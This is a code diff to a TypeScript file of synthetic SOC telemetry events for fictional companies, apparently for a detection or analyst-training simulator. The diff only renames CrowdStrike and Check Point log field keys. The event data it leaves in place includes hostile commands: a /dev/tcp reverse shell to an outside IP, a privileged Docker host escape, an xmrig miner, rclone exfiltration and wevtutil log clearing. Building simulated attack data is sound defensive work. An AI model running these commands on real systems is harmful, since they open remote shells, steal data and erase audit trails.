@@ -106,7 +106,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     src_ip: "172.16.10.7",
     description: "t.levy ran an npm build task (node process) on LAP-007",
     process: { name: "node", pid: 2341, parent_name: "launchd", parent_pid: 1, user: "t.levy", cmdline: "node /usr/local/lib/node_modules/npm/bin/npm-cli.js run build" },
-    raw: { "crowdstrike.event_simplename": "ProcessRollup2", "crowdstrike.detection.confidence": "high", "crowdstrike.detection.technique_id": "none", "action_result": "allowed", "file.signed": "true" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "high", "crowdstrike.TechniqueId": "none", "action_result": "allowed", "file.signed": "true" },
   },
   {
     id: "rs_cs_002", ts: "2026-05-10T08:20:00.000Z",
@@ -115,7 +115,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     src_ip: "172.16.10.12",
     description: "Developer opened Terminal (zsh) on LAP-012",
     process: { name: "zsh", pid: 5001, parent_name: "Terminal", parent_pid: 4800, user: "r.cohen", cmdline: "zsh -l" },
-    raw: { "crowdstrike.event_simplename": "ProcessRollup2", "action_result": "allowed" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "action_result": "allowed" },
   },
   {
     id: "rs_cs_003", ts: "2026-05-10T09:00:00.000Z",
@@ -124,7 +124,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     src_ip: "172.16.10.3",
     description: "Unwanted software detected on LAP-003",
     file: { path: "/Users/s.amir/Downloads/VideoConverter_setup.dmg", sha256: "d7f3a4b2c1e0f5a8b9c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4" },
-    raw: { "crowdstrike.event_simplename": "DetectionSummaryEvent", "threat.name": "PUP.BundleApp", "action_result": "quarantined", "quarantine.status": "quarantined", "crowdstrike.detection.severity": "LOW" },
+    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "threat.name": "PUP.BundleApp", "action_result": "quarantined", "quarantine.status": "quarantined", "crowdstrike.SeverityName": "LOW" },
   },
   {
     id: "rs_cs_004", ts: "2026-05-10T10:30:00.000Z",
@@ -133,7 +133,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     dst_ip: "52.84.241.10", dst_port: 443,
     network: { domain: "api.github.com", bytes_out: 1240, bytes_in: 5800 },
     description: "Outbound HTTPS connection from LAP-007 to api.github.com — allowed",
-    raw: { "crowdstrike.event_simplename": "NetworkConnectIP4", "destination.ip": "52.84.241.10", "destination.port": "443", "network.protocol": "tcp", "action_result": "allowed" },
+    raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "destination.ip": "52.84.241.10", "destination.port": "443", "network.protocol": "tcp", "action_result": "allowed" },
   },
   // ── AWS CloudTrail ────────────────────────────────────────────────────────
   {
@@ -242,7 +242,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     src_ip: "172.16.10.3",
     description: "osqueryd started on SRV-PROD-001 (fleet monitoring)",
     process: { name: "osqueryd", pid: 3300, parent_name: "launchd", parent_pid: 1, user: "root", cmdline: "/usr/local/bin/osqueryd --flagfile=/etc/osquery/osquery.flags" },
-    raw: { "crowdstrike.event_simplename": "ProcessRollup2", "crowdstrike.detection.confidence": "high", "action_result": "allowed" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "high", "action_result": "allowed" },
   },
   {
     id: "rs_cs_006", ts: "2026-05-10T11:15:00.000Z",
@@ -251,7 +251,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     src_ip: "172.16.10.7",
     description: "t.levy ran a migration script on LAP-007",
     process: { name: "python3", pid: 4450, parent_name: "Terminal", parent_pid: 4200, user: "t.levy", cmdline: "python3 scripts/migrate_prod_data.py --env prod --dry-run" },
-    raw: { "crowdstrike.event_simplename": "ProcessRollup2", "crowdstrike.detection.confidence": "medium", "action_result": "allowed" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "medium", "action_result": "allowed" },
   },
   {
     id: "rs_cs_007", ts: "2026-05-10T12:50:00.000Z",
@@ -260,7 +260,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     src_ip: "172.16.10.12",
     description: "r.cohen cloned internal git repo on LAP-012",
     process: { name: "git", pid: 5580, parent_name: "zsh", parent_pid: 5001, user: "r.cohen", cmdline: "git clone git@github.com:rocketstack/platform-core.git" },
-    raw: { "crowdstrike.event_simplename": "ProcessRollup2", "action_result": "allowed" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "action_result": "allowed" },
   },
   // ── AWS CloudTrail — additional API events ────────────────────────────────
   {
@@ -342,7 +342,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     fp_explanation: "Engineer ran a Python security script with unusual subprocess args to simulate API load. The command pattern (subprocess with shell=True and os.system calls) matches attacker tooling heuristics, but the script is in the RocketStack internal GitHub repo and was peer-reviewed. No outbound network connections were made.",
     description: "t.levy ran python3 security-load-test.py on LAP-007",
     process: { name: "python3", pid: 5900, parent_name: "zsh", parent_pid: 5001, user: "t.levy", cmdline: "python3 security-load-test.py --target https://api.rocketstack.io --requests 500 --concurrency 20" },
-    raw: { "crowdstrike.event_simplename": "ProcessRollup2", "crowdstrike.detection.confidence": "medium", "action_result": "allowed" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "medium", "action_result": "allowed" },
   },
   {
     id: "rs_fp_002", ts: "2026-05-10T11:45:00.000Z",
@@ -439,7 +439,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     vendor: "CrowdStrike Falcon", hostname: "LAP-DEV-07", user_email: "t.niv@rocketstack.io",
     src_ip: "10.20.3.88",
     description: "t.niv logon failure recorded on LAP-DEV-07 while connecting to bastion.rocketstack.io",
-    raw: { "crowdstrike.event_simplename": "UserLogonFailed2",
+    raw: { "crowdstrike.event_simpleName": "UserLogonFailed2",
            "user.name": "t.niv", "host.name": "LAP-DEV-07",
            "process.name": "ssh", "process.command_line": "ssh t.niv@bastion.rocketstack.io",
            "source.ip": "10.20.3.88", "destination.domain": "bastion.rocketstack.io",
@@ -551,8 +551,8 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     process: { name: "rclone", pid: 7821, parent_name: "bash", parent_pid: 7700,
                user: "t.chen", cmdline: "rclone copy /Users/t.chen/Downloads mega:backup --progress" },
     raw: {
-      "crowdstrike.event_simplename": "ProcessRollup2", "crowdstrike.detection.confidence": "high",
-      "crowdstrike.detection.technique_id": "T1567.002", "crowdstrike.detection.tactic": "Exfiltration",
+      "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "high",
+      "crowdstrike.TechniqueId": "T1567.002", "crowdstrike.Tactic": "Exfiltration",
       "process.command_line": "rclone copy /Users/t.chen/Downloads mega:backup --progress",
       "network.bytes_out": "4404019200", "destination.domain": "g.api.mega.co.nz",
       "action_result": "detect_only" },
@@ -705,7 +705,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     description: "s.amir pulled Docker image node:20-alpine on SRV-PROD-001",
     process: { name: "docker", pid: 6100, parent_name: "zsh", parent_pid: 5001,
                user: "s.amir", cmdline: "docker pull node:20-alpine" },
-    raw: { "crowdstrike.event_simplename": "ProcessRollup2", "action_result": "allowed",
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "action_result": "allowed",
            "container.image.name": "node:20-alpine", "container.runtime": "docker" },
   },
   {
@@ -716,7 +716,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     description: "r.cohen ran docker-compose up for local dev stack on LAP-012",
     process: { name: "docker-compose", pid: 6210, parent_name: "zsh", parent_pid: 5001,
                user: "r.cohen", cmdline: "docker-compose -f docker-compose.dev.yml up -d" },
-    raw: { "crowdstrike.event_simplename": "ProcessRollup2", "action_result": "allowed",
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "action_result": "allowed",
            "container.services": "api,postgres,redis", "container.runtime": "docker" },
   },
 
@@ -981,10 +981,9 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     mitre_technique: "T1021.002", mitre_tactic: "Lateral Movement",
     description: "SMB session from workstation WS-MED-022 (192.168.10.22) to EMR server SRV-MEDCORE-EMR01 on port 445",
     raw: {
-      "cp.action":                     "Accept",
-      "cp.blade":                      "Firewall",
-      "cp.service":                    "Microsoft-DS",
-      "cp.app_name":                   "SMB",
+      "action":                        "Accept",
+      "service_id":                    "Microsoft-DS",
+      "app_name":                      "SMB",
       "proto":                         "6",
       "protocol":                      "TCP",
       "src":                           "192.168.10.22",
@@ -993,8 +992,8 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
       "sport_svc":                     "49811",
       "src_machine_name":              "WS-MED-022",
       "dst_machine_name":              "SRV-MEDCORE-EMR01",
-      "cp.bytes_out":                  "84992",
-      "cp.bytes":                      "12288",
+      "bytes_out":                     "84992",
+      "bytes":                         "12288",
       "snid":                          "7fa3b2c1",
       "rule_name":                     "Internal-Any-Allow",
       "layer_name":                    "Network",
@@ -1151,7 +1150,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     vendor: "Check Point NGFW", src_ip: "192.168.10.45", dst_ip: "52.96.12.14", dst_port: 443,
     protocol: "tcp",
     description: "Outbound HTTPS connection from WS-MED-045 to outlook.office365.com — allowed",
-    raw: { "cp.action": "Accept", "cp.blade": "Firewall", "cp.service": "HTTPS", "cp.bytes": "124800", "firewall.action": "allow", "action_result": "allowed" },
+    raw: { "action": "Accept", "layer_name": "Network", "service_id": "HTTPS", "bytes": "124800", "firewall.action": "allow", "action_result": "allowed" },
   },
   {
     id: "mc_fw_002", ts: "2026-05-10T08:44:30.000Z",
@@ -1161,7 +1160,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     protocol: "tcp",
     description: "Outbound HTTP connection from WS-MED-022 to 185.220.101.72 — uncategorised destination, review required",
     mitre_technique: "T1071.001",
-    raw: { "cp.action": "Accept", "cp.blade": "Application Control", "cp.service": "HTTP", "cp.bytes_out": "3481", "cp.app_category": "Uncategorized", "firewall.action": "allow", "action_result": "allowed" },
+    raw: { "action": "Accept", "layer_name": "Application & URL Filtering", "service_id": "HTTP", "bytes_out": "3481", "app_category": "Uncategorized", "firewall.action": "allow", "action_result": "allowed" },
   },
   {
     id: "mc_fw_003", ts: "2026-05-10T09:30:00.000Z",
@@ -1169,7 +1168,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     vendor: "Check Point NGFW", src_ip: "192.168.10.88", dst_ip: "45.142.212.100", dst_port: 4444,
     protocol: "tcp",
     description: "Outbound TCP connection from WS-ICU-088 to 45.142.212.100:4444 — non-standard port, blocked",
-    raw: { "cp.action": "Drop", "cp.blade": "Application Control", "cp.service": "Unknown", "firewall.action": "block", "action_result": "blocked", "destination.geo.country_name": "Russia" },
+    raw: { "action": "Drop", "layer_name": "Application & URL Filtering", "service_id": "Unknown", "firewall.action": "block", "action_result": "blocked", "destination.geo.country_name": "Russia" },
   },
   {
     id: "mc_fw_004", ts: "2026-05-10T10:00:00.000Z",
@@ -1177,7 +1176,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     vendor: "Check Point NGFW", src_ip: "192.168.10.200", dst_ip: "40.112.72.205", dst_port: 443,
     protocol: "tcp",
     description: "Outbound HTTPS connection from SRV-MEDCORE-FILE01 to azure-backup.core.windows.net — backup traffic",
-    raw: { "cp.action": "Accept", "cp.blade": "Firewall", "cp.service": "HTTPS", "cp.bytes": "44040192", "firewall.action": "allow", "action_result": "allowed" },
+    raw: { "action": "Accept", "layer_name": "Network", "service_id": "HTTPS", "bytes": "44040192", "firewall.action": "allow", "action_result": "allowed" },
   },
   {
     id: "mc_fw_005", ts: "2026-05-10T11:45:00.000Z",
@@ -1185,7 +1184,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     vendor: "Check Point NGFW", src_ip: "91.220.163.14", dst_ip: "192.168.10.1", dst_port: 3389,
     protocol: "tcp",
     description: "Inbound RDP scan from 91.220.163.14 to 192.168.10.1 — blocked, known scanner IP",
-    raw: { "cp.action": "Drop", "cp.blade": "IPS", "protection_name": "Microsoft RDP Scan", "protection_type": "Scanner", "firewall.action": "block", "action_result": "blocked" },
+    raw: { "action": "Drop", "layer_name": "Threat Prevention", "protection_name": "Microsoft RDP Scan", "protection_type": "Scanner", "firewall.action": "block", "action_result": "blocked" },
   },
   {
     id: "mc_fw_006", ts: "2026-05-10T12:10:00.000Z",
@@ -1193,7 +1192,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     vendor: "Check Point NGFW", src_ip: "192.168.50.15", dst_ip: "192.168.10.200", dst_port: 445,
     protocol: "tcp",
     description: "SMB connection from MED-DEVICE-VLAN to SRV-MEDCORE-FILE01 — file share access",
-    raw: { "cp.action": "Accept", "cp.blade": "Firewall", "cp.service": "Microsoft-DS", "firewall.action": "allow", "action_result": "allowed" },
+    raw: { "action": "Accept", "layer_name": "Network", "service_id": "Microsoft-DS", "firewall.action": "allow", "action_result": "allowed" },
   },
 
   // ════════════════════════════════════════════════════════════════
@@ -1516,9 +1515,9 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     vendor: "Check Point NGFW", src_ip: "91.108.4.222",
     mitre_technique: "T1110.001", mitre_tactic: "Credential Access",
     description: "Check Point IPS dropped inbound traffic from 91.108.4.222 on protection VPN Brute Force Attack",
-    raw: { "cp.blade": "IPS", "protection_name": "VPN Brute Force Attack",
+    raw: { "protection_name": "VPN Brute Force Attack",
            "protection_type": "signature", "severity": "High", "confidence_level": "High",
-           "cp.action": "Drop", "src": "91.108.4.222", "dst": "192.168.10.1",
+           "action": "Drop", "src": "91.108.4.222", "dst": "192.168.10.1",
            "svc": "443", "proto": "6", "protocol": "TCP",
            "inzone": "External", "outzone": "Internal",
            "layer_name": "Threat Prevention", "ProductName": "IPS",
@@ -1579,8 +1578,8 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     mitre_technique: "T1048", mitre_tactic: "Exfiltration",
     description: "The PACS imaging server sent 22 GB of medical images over SFTP to an external IP",
     raw: {
-      "cp.blade": "Application Control", "cp.app_name": "SFTP",
-      "cp.action": "Accept", "cp.bytes_out": "23622320128",
+      "app_name": "SFTP",
+      "action": "Accept", "bytes_out": "23622320128",
       "src": "10.50.1.40", "dst": "185.156.72.88",
       "svc": "22", "duration": "1820",
       "destination.geo.country_iso_code": "RO",
@@ -1785,8 +1784,8 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     vendor: "Check Point NGFW", src_ip: "192.168.10.67", dst_ip: "192.168.50.10", dst_port: 11112,
     protocol: "tcp",
     description: "Internal PACS query from WS-MED-067 to SRV-MEDCORE-PACS01 — allowed",
-    raw: { "cp.action": "Accept", "cp.blade": "Firewall",
-           "cp.service": "DICOM", "cp.bytes": "44032", "firewall.action": "allow", "action_result": "allowed" },
+    raw: { "action": "Accept", "layer_name": "Network",
+           "service_id": "DICOM", "bytes": "44032", "firewall.action": "allow", "action_result": "allowed" },
   },
   {
     id: "mc_fw_008", ts: "2026-05-10T08:00:00.000Z",
@@ -1794,8 +1793,8 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     vendor: "Check Point NGFW", src_ip: "192.168.10.200", dst_ip: "20.190.128.1", dst_port: 443,
     protocol: "tcp",
     description: "Outbound HTTPS from SRV-MEDCORE-EMR01 to Microsoft Azure — expected Epiq cloud sync",
-    raw: { "cp.action": "Accept", "cp.blade": "Application Control",
-           "cp.app_name": "Office365", "cp.bytes_out": "204800",
+    raw: { "action": "Accept", "layer_name": "Application & URL Filtering",
+           "app_name": "Office365", "bytes_out": "204800",
            "firewall.action": "allow", "action_result": "allowed" },
   },
   {
@@ -1804,8 +1803,8 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     vendor: "Check Point NGFW", src_ip: "192.168.10.33", dst_ip: "192.168.10.200", dst_port: 443,
     protocol: "tcp",
     description: "Nurse station WS-NURS-033 connected to Epiq EMR API on SRV-MEDCORE-EMR01 — allowed",
-    raw: { "cp.action": "Accept", "cp.blade": "Firewall",
-           "cp.service": "HTTPS", "cp.bytes": "51200", "firewall.action": "allow", "action_result": "allowed" },
+    raw: { "action": "Accept", "layer_name": "Network",
+           "service_id": "HTTPS", "bytes": "51200", "firewall.action": "allow", "action_result": "allowed" },
   },
 
   // ── More Cisco VPN — remote clinical staff ────────────────────────────────
@@ -2398,7 +2397,7 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
     src_ip: "10.100.1.55",
     description: "explorer.exe launched BLOOMBERG.exe on WKS-QB-055 — user opened Bloomberg terminal",
     process: { name: "BLOOMBERG.exe", pid: 4400, parent_name: "explorer.exe", parent_pid: 3100, user: "f.zimmermann", integrity: "medium" },
-    raw: { "crowdstrike.event_simplename": "ProcessRollup2", "crowdstrike.detection.confidence": "high", "file.signed": "true", "action_result": "allowed" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "high", "file.signed": "true", "action_result": "allowed" },
   },
   {
     id: "qb_cs_002", ts: "2026-05-10T09:00:00.000Z",
@@ -2408,7 +2407,7 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
     src_ip: "10.100.1.33",
     description: "PDF attachment opened in Acrobat Reader on WKS-QB-033",
     process: { name: "AcroRd32.exe", pid: 3800, parent_name: "OUTLOOK.EXE", parent_pid: 2900, user: "e.steiner", integrity: "low" },
-    raw: { "crowdstrike.event_simplename": "ProcessRollup2", "crowdstrike.SandboxVerdict": "true", "file.signed": "true", "action_result": "allowed" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.SandboxVerdict": "true", "file.signed": "true", "action_result": "allowed" },
   },
   {
     id: "qb_cs_003", ts: "2026-05-10T10:45:00.000Z",
@@ -2416,7 +2415,7 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
     vendor: "CrowdStrike Falcon", hostname: "WKS-QB-012", src_ip: "10.100.1.12",
     description: "CrowdStrike raised a memory-based detection inside svchost.exe on WKS-QB-012 and killed the process",
     file: { path: "memory://svchost.exe", sha256: "32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77" },
-    raw: { "crowdstrike.event_simplename": "DetectionSummaryEvent", "threat.name": "CobaltStrike.beacon.reflective", "action_result": "process_killed", "quarantine.status": "quarantined", "process.killed": "true", "crowdstrike.detection.severity": "CRITICAL", "policy.name": "Banking-Prevent" },
+    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "threat.name": "CobaltStrike.beacon.reflective", "action_result": "process_killed", "quarantine.status": "quarantined", "process.killed": "true", "crowdstrike.SeverityName": "CRITICAL", "policy.name": "Banking-Prevent" },
   },
   // ── AWS GovCloud ──────────────────────────────────────────────────────────
   {
@@ -2479,7 +2478,7 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
     fp_explanation: "The QuantumBank Automated Testing team runs daily smoke tests against the core banking sandbox using a test script that calls net.exe commands to verify connectivity. net.exe from a user session looks like lateral movement recon, but this is a scheduled test job running under the test-runner service account. CHG-QB-218 covers this activity.",
     description: "The automated test-runner account queried shared resources on SRV-QB-CORE01 from WKS-QB-033",
     process: { name: "net.exe", pid: 7700, parent_name: "python.exe", parent_pid: 7600, user: "svc-test-runner", cmdline: "net view \\\\SRV-QB-CORE01 /all" },
-    raw: { "crowdstrike.event_simplename": "ProcessRollup2", "crowdstrike.detection.technique_id": "T1016", "crowdstrike.detection.confidence": "medium", "action_result": "allowed" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.TechniqueId": "T1016", "crowdstrike.Confidence": "medium", "action_result": "allowed" },
   },
   {
     id: "qb_fp_002", ts: "2026-05-10T11:30:00.000Z",
@@ -2675,12 +2674,12 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
     mitre_technique: "T1052.001", mitre_tactic: "Exfiltration",
     description: "CrowdStrike blocked h.weber from copying 11,000 SWIFT transaction records to a USB drive at 19:22",
     raw: {
-      "crowdstrike.event_simplename": "DeviceControlPolicyViolation", "crowdstrike.detection.pattern_disposition_description": "blocked",
-      "crowdstrike.detection.policy_name": "PCI-USB-Block",
+      "crowdstrike.event_simpleName": "DeviceControlPolicyViolation", "crowdstrike.PatternDispositionDescription": "blocked",
+      "crowdstrike.PolicyName": "PCI-USB-Block",
       "usb.serial": "9F2C-1A44", "usb.vendor": "Verbatim",
       "file.name": "swift_transactions_may2026.xlsx", "file.size_bytes": "41943040",
       "dlp.records_count": "11000", "dlp.data_classification": "PCI — SWIFT Financial",
-      "crowdstrike.detection.technique_id": "T1052.001", "crowdstrike.detection.severity": "CRITICAL",
+      "crowdstrike.TechniqueId": "T1052.001", "crowdstrike.SeverityName": "CRITICAL",
       "action_result": "blocked" },
   },
   {
@@ -3124,7 +3123,7 @@ const MEDCORE_ATTACKS: TelemetryEvent[] = [
     severity: "critical", vendor: "Check Point NGFW", src_ip: "192.168.10.45", dst_ip: "95.216.88.12", dst_port: 443,
     description: "1.8 GB outbound HTTPS transfer from WS-MED-045 to 95.216.88.12 (FI) with no matching TLS SNI",
     mitre_technique: "T1041",
-    raw: { "cp.action": "Accept", "cp.blade": "Application Control", "cp.app_name": "HTTPS", "cp.service": "HTTPS", "cp.bytes_out": "1932735283", "src": "192.168.10.45", "dst": "95.216.88.12", "svc": "443", "proto": "6", "protocol": "TCP", "rule_name": "Internal-to-Any-Outbound", "layer_name": "Network", "destination.geo.country_iso_code": "FI", "firewall.action": "allow", "action_result": "allowed" },
+    raw: { "action": "Accept", "app_name": "HTTPS", "bytes_out": "1932735283", "src": "192.168.10.45", "dst": "95.216.88.12", "svc": "443", "proto": "6", "protocol": "TCP", "rule_name": "Internal-to-Any-Outbound", "layer_name": "Network", "destination.geo.country_iso_code": "FI", "firewall.action": "allow", "action_result": "allowed" },
   },
   // ── Chain C ──────────────────────────────────────────────────────────────
   {
@@ -3418,7 +3417,7 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     description: "Installing the npm package rocketstack-utils 3.2.1 ran an automatic post-install script on LAP-003",
     mitre_technique: "T1195.001",
     process: { name: "node", pid: 9310, parent_name: "npm", parent_pid: 9300, user: "s.amir", cmdline: "node /tmp/.npm-install/postinstall.js" },
-    raw: { "crowdstrike.event_simplename": "ProcessRollup2", "crowdstrike.detection.confidence": "low", "npm.package": "rocketstack-utils@3.2.1", "action_result": "allowed" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "low", "npm.package": "rocketstack-utils@3.2.1", "action_result": "allowed" },
   },
   {
     id: "rs_b2", ts: "2026-05-10T08:48:00Z", source: "dns", event_type: "dns_query",
@@ -3434,7 +3433,7 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     description: "A node process on LAP-003 launched bash with a /dev/tcp redirect and connected out to 104.248.93.41:4444",
     mitre_technique: "T1059.004",
     process: { name: "bash", pid: 9420, parent_name: "node", parent_pid: 9310, user: "s.amir", cmdline: "bash -i >& /dev/tcp/104.248.93.41/4444 0>&1" },
-    raw: { "crowdstrike.event_simplename": "NetworkConnectIP4", "crowdstrike.detection.confidence": "high", "action_result": "allowed" },
+    raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "crowdstrike.Confidence": "high", "action_result": "allowed" },
   },
   {
     id: "rs_b4", ts: "2026-05-10T09:01:00Z", source: "cloudtrail", event_type: "cloud_api_call",
@@ -3450,7 +3449,7 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     description: "t.levy ran a Docker container on LAP-007 with --privileged, host PID/network namespaces and / mounted at /host",
     mitre_technique: "T1611",
     process: { name: "docker", pid: 12001, parent_name: "zsh", parent_pid: 11800, user: "t.levy", cmdline: "docker run --privileged --pid=host --net=host -v /:/host ubuntu nsenter -t 1 -m -u -i -n sh" },
-    raw: { "crowdstrike.event_simplename": "ProcessRollup2", "crowdstrike.detection.confidence": "low", "action_result": "allowed" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "low", "action_result": "allowed" },
   },
   {
     id: "rs_c2", ts: "2026-05-10T15:09:00Z", source: "edr", event_type: "process_create",
@@ -3458,7 +3457,7 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     description: "xmrig started as root on LAP-007 from a shell, connecting to pool.minexmr.com:4444",
     mitre_technique: "T1496",
     process: { name: "xmrig", pid: 12050, parent_name: "sh", parent_pid: 12010, user: "root", cmdline: "xmrig --coin monero --url pool.minexmr.com:4444 --user 47abc..." },
-    raw: { "crowdstrike.event_simplename": "ProcessRollup2", "crowdstrike.detection.confidence": "medium", "action_result": "allowed" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "medium", "action_result": "allowed" },
   },
   {
     id: "rs_c3", ts: "2026-05-10T15:14:00Z", source: "cloudtrail", event_type: "cloud_api_call",
@@ -3709,7 +3708,7 @@ const QUANTUMBANK_ATTACKS: TelemetryEvent[] = [
     description: "OUTLOOK.EXE on WKS-QB-012 spawned svchost.exe from a user session and CrowdStrike raised a detection on it",
     mitre_technique: "T1055.001",
     process: { name: "svchost.exe", pid: 9912, parent_name: "OUTLOOK.EXE", parent_pid: 3200, user: "m.huber", cmdline: "svchost.exe -k netsvcs" },
-    raw: { "crowdstrike.event_simplename": "DetectionSummaryEvent", "threat.name": "CobaltStrike.beacon.v4", "crowdstrike.detection.confidence": "high", "action_result": "allowed", "crowdstrike.detection.severity": "MEDIUM" },
+    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "threat.name": "CobaltStrike.beacon.v4", "crowdstrike.Confidence": "high", "action_result": "allowed", "crowdstrike.SeverityName": "MEDIUM" },
   },
   {
     id: "qb_a3", ts: "2026-05-10T09:05:00Z", source: "firewall", event_type: "net_connection",
@@ -3753,7 +3752,7 @@ const QUANTUMBANK_ATTACKS: TelemetryEvent[] = [
     description: "wevtutil.exe cl Security ran as l.brunner on SRV-QB-ADMIN01; CrowdStrike terminated the process",
     mitre_technique: "T1070.001",
     process: { name: "wevtutil.exe", pid: 6621, parent_name: "cmd.exe", parent_pid: 6620, user: "l.brunner", cmdline: "wevtutil.exe cl Security" },
-    raw: { "crowdstrike.event_simplename": "DetectionSummaryEvent", "crowdstrike.detection.technique": "Clear Windows Event Logs", "crowdstrike.detection.technique_id": "T1070.001", "crowdstrike.detection.tactic": "Defense Evasion", "crowdstrike.detection.severity": "Critical", "crowdstrike.detection.pattern_disposition_description": "Process Terminated", "action_result": "process_killed", "process.killed": "true" },
+    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "crowdstrike.Technique": "Clear Windows Event Logs", "crowdstrike.TechniqueId": "T1070.001", "crowdstrike.Tactic": "Defense Evasion", "crowdstrike.SeverityName": "Critical", "crowdstrike.PatternDispositionDescription": "Process Terminated", "action_result": "process_killed", "process.killed": "true" },
   },
   // ── Chain C ──────────────────────────────────────────────────────────────
   {
